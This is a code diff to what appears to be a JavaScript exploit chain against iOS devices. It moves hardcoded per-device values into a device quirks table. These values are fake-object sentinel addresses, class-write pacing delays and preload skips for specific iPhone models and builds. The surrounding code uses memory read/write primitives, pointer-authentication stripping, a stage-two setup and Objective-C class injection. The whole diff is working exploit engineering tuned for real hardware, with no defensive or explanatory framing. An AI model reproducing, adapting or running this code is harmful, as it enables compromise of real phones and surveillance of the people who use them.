@@ -103,6 +103,31 @@ function offsetHex(offset) {
 function valueHex(value) {
     return typeof value === 'bigint' ? value.hex() : String(value);
 }
+const deviceQuirks = {
+    "iPhone15,3_22D60": {
+        stage2Sentinel: 0x0108240700006000n,
+        skipOptionalPreloads: true,
+        classLoadPacingMs: 20
+    },
+    "iPhone11,8_22B91": {
+        skipPreloadClassNames: ["AVSpeechSynthesisMarker"],
+        classLoadPacingMs: 10
+    }
+};
+function quirksForDevice(model) {
+    return deviceQuirks[model] || {};
+}
+function shouldSkipPreloadClass(quirks, className) {
+    if (quirks.skipOptionalPreloads)
+        return true;
+    return Array.isArray(quirks.skipPreloadClassNames) && quirks.skipPreloadClassNames.indexOf(className) !== -1;
+}
+function quirkPacing(label, ms) {
+    if (!ms)
+        return;
+    print(`${label}: pacing ${ms}ms`);
+    sleep(ms);
+}
 function stripPointerForRead(value, label, log) {
     const stripped = value.noPAC();
     if (stripped !== value)
@@ -18488,7 +18513,8 @@ const device_chipset = {
           }
           print("setup_stage2: building change_scribble_holder");
           print("setup_stage2: fake sentinel begin");
-          const stage2FakeSentinelAddr = device_model === "iPhone15,3_22D60" ? 0x0108240700006000n : 0x108240700000000n;
+          const stage2Quirks = quirksForDevice(device_model);
+          const stage2FakeSentinelAddr = stage2Quirks.stage2Sentinel || 0x108240700000000n;
           print(`setup_stage2: fake sentinel addr=${stage2FakeSentinelAddr.hex()}`);
           let fake_sentinel = p.fakeobj(stage2FakeSentinelAddr);
           print("setup_stage2: fake sentinel done");
@@ -18574,6 +18600,7 @@ const device_chipset = {
           };
           print("setup_stage2: read/write helpers installed");
           p.device_model = device_model;
+          p.device_quirks = quirksForDevice(device_model);
           p.chipset = chipset;
           p.sbx0_fallback_start = isFinite(globalThis.__ls_sbx0_fallback_start) ? globalThis.__ls_sbx0_fallback_start : 0;
           globalThis.device_model = p.device_model;
@@ -18799,9 +18826,11 @@ async function main() {
       print(`loadObjcClass: helper wrappedBitmap=${wrappedBitmap.hex()}`);
       const imagebuffer = p.read64(wrappedBitmap + 0x10n);
       print(`loadObjcClass: helper imagebuffer=${imagebuffer.hex()}`);
+      quirkPacing("loadObjcClass: before helper class write", (p.device_quirks && p.device_quirks.classLoadPacingMs) || 0);
       print("loadObjcClass: helper class write begin");
       p.write64(imagebuffer + 0x20n, cls);
       print("loadObjcClass: helper class write done");
+      quirkPacing("loadObjcClass: after helper class write", (p.device_quirks && p.device_quirks.classLoadPacingMs) || 0);
       print("loadObjcClass: helper metadata probes skipped");
       p.class_load_worker_next = helperIndex + 1;
       print(`loadObjcClass: helper close skipped index=${helperIndex}`);
@@ -18816,9 +18845,11 @@ async function main() {
     print(`loadObjcClass: wrappedBitmap=${wrappedBitmap.hex()}`);
     const imagebuffer = p.read64(wrappedBitmap + 0x10n);
     print(`loadObjcClass: imagebuffer=${imagebuffer.hex()}`);
+    quirkPacing("loadObjcClass: before local class write", (p.device_quirks && p.device_quirks.classLoadPacingMs) || 0);
     print("loadObjcClass: class write begin");
     p.write64(imagebuffer + 0x20n, cls);
     print("loadObjcClass: class write done");
+    quirkPacing("loadObjcClass: after local class write", (p.device_quirks && p.device_quirks.classLoadPacingMs) || 0);
     print("loadObjcClass: local metadata probes skipped");
     print("loadObjcClass: bitmap close begin");
     bitmap.close();
@@ -18975,12 +19006,8 @@ async function main() {
           ];
           for (let i = 0; i < preloadClasses.length; ++i) {
             const [className, cls] = preloadClasses[i];
-            if (p.device_model === "iPhone15,3_22D60") {
-              print(`preload class[${i}] ${className} skipped for ${p.device_model} cls=${cls.hex()}`);
-              sleep(10);
-              continue;
-            }
-            if (p.device_model === "iPhone11,8_22B91" && i === 1) {
+            const quirks = p.device_quirks || quirksForDevice(p.device_model);
+            if (shouldSkipPreloadClass(quirks, className)) {
               print(`preload class[${i}] ${className} skipped for ${p.device_model} cls=${cls.hex()}`);
               sleep(10);
               continue;
